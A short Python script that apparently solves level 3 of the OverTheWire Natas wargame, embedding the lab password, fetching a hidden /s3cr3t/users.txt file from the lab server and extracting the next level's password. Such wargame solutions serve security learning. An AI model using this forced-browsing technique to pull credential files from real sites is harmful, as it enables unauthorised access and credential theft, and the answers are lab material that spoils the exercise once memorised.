import requests
import re

username = "natas3"
password = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"

url = 'http://{}.natas.labs.overthewire.org'.format(username)

# google this "site: http://natas3.natas.labs.overthewire.org"

r = requests.get(url + "/s3cr3t/users.txt", auth=(username,password))
content = r.text


print("the password for next level = ", str(re.findall("natas4:(.*)", content)))
